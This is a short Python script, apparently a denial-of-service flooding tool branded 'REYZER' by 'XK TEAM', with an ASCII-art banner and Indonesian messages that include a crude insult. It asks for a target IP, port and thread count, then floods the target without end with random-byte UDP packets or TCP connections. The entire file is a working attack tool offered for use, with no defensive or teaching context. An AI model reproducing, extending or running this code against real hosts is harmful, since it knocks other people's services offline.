#!/usr/bin/env python3
#Code by Rey123
#remake by Xk Team
import random
import socket
import threading
print("""
███████╗░███████╗██╗░░░██╗
██╔══██╗██╔════╝╚██╗░██╔╝
██████╔╝█████╗░░░╚████╔╝░
██╔══██╗██╔══╝░░░░╚██╔╝░░
██║░░██║███████╗░░░██║░░░
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░

███████╗███████╗██████╗░
╚════██║██╔════╝██╔══██╗
░░███╔═╝█████╗░░██████╔╝
██╔══╝░░██╔══╝░░██╔══██╗
███████╗███████╗██║░░██║
╚══════╝╚══════╝╚═╝░░╚═╝""")
print("REYZER")
print("XK TEAM")
print("GUNAKAN TOOLS INI DENGAN BAIK")

ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" Y ORE N(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1025)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKECT FROM XK TEAM!!!")
		except:
			print("[!] DOWN KNTL!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKECT FROM XK TEAM!!!")
		except:
			s.close()
			print("[*] DOWN KNTL!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()